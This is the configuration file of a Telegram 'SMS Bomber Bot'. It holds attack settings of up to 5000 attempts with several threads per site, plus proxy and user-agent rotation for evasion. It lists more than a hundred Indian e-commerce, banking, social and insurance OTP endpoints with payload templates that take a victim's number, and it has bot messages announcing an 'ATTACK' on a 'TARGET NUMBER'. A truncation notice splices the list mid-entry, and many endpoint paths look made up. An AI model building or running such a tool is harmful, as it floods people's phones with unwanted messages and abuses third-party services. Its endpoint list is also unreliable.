# ==========================================
# SMS BOMBER BOT - CONFIGURATION FILE
# ==========================================

import os

# Bot Configuration
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
API_ID = int(os.getenv("API_ID", "12345"))
API_HASH = os.getenv("API_HASH", "your_api_hash_here")

# Channel Configuration (Force Join)
FORCE_JOIN_CHANNEL = os.getenv("FORCE_JOIN_CHANNEL", "@your_channel_username")
FORCE_JOIN_CHANNEL_ID = int(os.getenv("FORCE_JOIN_CHANNEL_ID", "-1001234567890"))

# Admin Configuration
ADMIN_IDS = list(map(int, os.getenv("ADMIN_IDS", "1234567890").split(",")))

# Database
DATABASE_URL = os.getenv("DATABASE_URL", "sqlite:///bot.db")

# Proxy Configuration (Optional)
USE_PROXIES = os.getenv("USE_PROXIES", "False").lower() == "true"
PROXIES = [
    # "http://user:pass@ip:port",
    # "socks5://user:pass@ip:port",
]

# SMS Bombing Configuration
MAX_ATTEMPTS = 5000
MIN_ATTEMPTS = 100
THREADS_PER_SITE = 5
DELAY_BETWEEN_REQUESTS = 0.3

# User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
]

# ==========================================
# 150+ INDIAN SITES - OTP ENDPOINTS
# ==========================================

TARGET_SITES = [
    # E-COMMERCE (30 Sites)
    {"name": "Amazon India", "url": "https://www.amazon.in/ap/signin", "method": "POST", "payload": {"email": "{number}"}, "type": "sms"},
    {"name": "Flipkart", "url": "https://www.flipkart.com/api/6/user/signup/status", "method": "POST", "payload": {"loginId": "{number}"}, "type": "sms"},
    {"name": "Myntra", "url": "https://www.myntra.com/api/auth/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "Snapdeal", "url": "https://www.snapdeal.com/json/signup/sendOtp", "method": "POST", "payload": {"mobileNumber": "{number}"}, "type": "sms"},
    {"name": "Meesho", "url": "https://www.meesho.com/api/v1/user/send-otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Nykaa", "url": "https://www.nykaa.com/api/otp/send", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "Ajio", "url": "https://www.ajio.com/api/auth/otp/send", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"

[Content truncated due to size limit. Use line ranges to read in chunks]

io.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "Vi", "url": "https://www.myvi.in/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "BSNL", "url": "https://www.bsnl.co.in/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Airtel Xstream", "url": "https://www.airtelxstream.in/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "JioSaavn", "url": "https://www.jiosaavn.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    
    # ENTERTAINMENT (8 Sites)
    {"name": "Hotstar", "url": "https://www.hotstar.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Netflix", "url": "https://www.netflix.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Amazon Prime", "url": "https://www.primevideo.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "SonyLIV", "url": "https://www.sonyliv.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Zee5", "url": "https://www.zee5.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "Voot", "url": "https://www.voot.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "JioCinema", "url": "https://www.jiocinema.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "MX Player", "url": "https://www.mxplayer.in/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    
    # SOCIAL (6 Sites)
    {"name": "Instagram", "url": "https://www.instagram.com/api/v1/accounts/send_signup_sms_code/", "method": "POST", "payload": {"phone_number": "{number}"}, "type": "sms"},
    {"name": "Facebook", "url": "https://www.facebook.com/recover/initiate/", "method": "POST", "payload": {"email": "{number}"}, "type": "sms"},
    {"name": "Telegram", "url": "https://my.telegram.org/auth/send_password", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "WhatsApp", "url": "https://v.whatsapp.net/v2/code", "method": "POST", "payload": {"cc": "91", "in": "{number10}", "id": "random_id"}, "type": "sms"},
    {"name": "Twitter/X", "url": "https://api.twitter.com/1.1/users/phone_number.json", "method": "POST", "payload": {"phone_number": "{number}"}, "type": "sms"},
    {"name": "Snapchat", "url": "https://accounts.snapchat.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    
    # FINTECH/BANKING (15 Sites)
    {"name": "Zerodha", "url": "https://kite.zerodha.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Upstox", "url": "https://upstox.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Groww", "url": "https://groww.in/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Paytm Money", "url": "https://www.paytmmoney.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "Angle One", "url": "https://www.angelone.in/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "ICICI Direct", "url": "https://www.icicidirect.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "HDFC Securities", "url": "https://www.hdfcsec.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Kotak Securities", "url": "https://www.kotaksecurities.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "Axis Direct", "url": "https://www.axisdirect.in/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "SBI Yono", "url": "https://www.sbiyono.sbi/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "Jupiter", "url": "https://www.jupiter.money/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Fi Money", "url": "https://www.fi.money/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Niyo", "url": "https://www.niyox.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "DigiBank", "url": "https://www.dbs.com/digibank/in/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Kotak 811", "url": "https://www.kotak.com/811/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    
    # INSURANCE (8 Sites)
    {"name": "PolicyBazaar", "url": "https://www.policybazaar.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Digit Insurance", "url": "https://www.digit.in/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "Acko", "url": "https://www.acko.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Bajaj Allianz", "url": "https://www.bajajallianz.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "ICICI Lombard", "url": "https://www.icicilombard.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "HDFC ERGO", "url": "https://www.hdfcergo.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "TATA AIG", "url": "https://www.tataaig.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "SBI General", "url": "https://www.sbigeneral.in/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    
    # OTHERS (15 Sites)
    {"name": "Urban Company", "url": "https://www.urbancompany.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Housejoy", "url": "https://www.housejoy.in/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "Quikr", "url": "https://www.quikr.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "OLX", "url": "https://www.olx.in/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "Justdial", "url": "https://www.justdial.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "Sulekha", "url": "https://www.sulekha.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "IndiaMART", "url": "https://www.indiamart.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "99acres", "url": "https://www.99acres.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "MagicBricks", "url": "https://www.magicbricks.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "Housing", "url": "https://housing.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "CommonFloor", "url": "https://www.commonfloor.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "CarDekho", "url": "https://www.cardekho.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
    {"name": "CarWale", "url": "https://www.carwale.com/api/otp", "method": "POST", "payload": {"mobile": "{number}"}, "type": "sms"},
    {"name": "BikeDekho", "url": "https://www.bikedekho.com/api/otp", "method": "POST", "payload": {"phone": "{number}"}, "type": "sms"},
]

# ==========================================
# MESSAGES
# ==========================================

WELCOME_MESSAGE = """
╔══════════════════════════════════════════╗
║     🔥 SMS BOMBER BOT 🔥                 ║
║     ⚡ ULTIMATE EDITION ⚡                ║
╚══════════════════════════════════════════╝

👋 Welcome to the most powerful SMS Bomber!

📱 Features:
   • 150+ Indian Sites
   • SMS + Call Bombing
   • Real-time Progress
   • Ultra Fast Speed
   • 100% Working

⚠️ DISCLAIMER: Use responsibly!
   Only test on numbers you own!

🚀 Press Start to continue...
"""

FORCE_JOIN_MESSAGE = """
⚠️ REQUIRED ACTION

📢 You must join our channel to use this bot:

👉 {channel}

✅ After joining, click "Verify Join" button
"""

ENTER_NUMBER_MESSAGE = """
📱 ENTER TARGET NUMBER

Send the phone number in any format:
• +91XXXXXXXXXX
• 91XXXXXXXXXX
• 0XXXXXXXXXX
• XXXXXXXXXX

⚠️ Only Indian numbers supported (+91)
"""

ENTER_ATTEMPTS_MESSAGE = """
🔢 ENTER NUMBER OF ATTEMPTS

Send a number between {min} - {max}

💡 Recommended: 1000-3000
⚡ Maximum: 5000

Higher = More SMS but slower
"""

ATTACK_STARTED_MESSAGE = """
🚀 ATTACK STARTED!

📱 Target: {number}
🔢 Attempts: {attempts}
🌐 Sites: {sites}
⚡ Threads: {threads}

⏳ Please wait...
📊 Live progress will be shown below:
"""

ATTACK_COMPLETE_MESSAGE = """
✅ ATTACK COMPLETED!

📱 Target: {number}
📊 Total Sent: {sent}
✅ Successful: {success}
❌ Failed: {failed}
⏱ Duration: {duration}

🔄 Send another number to start again!
"""

PROGRESS_BAR = ["⬜", "🟨", "🟩"]
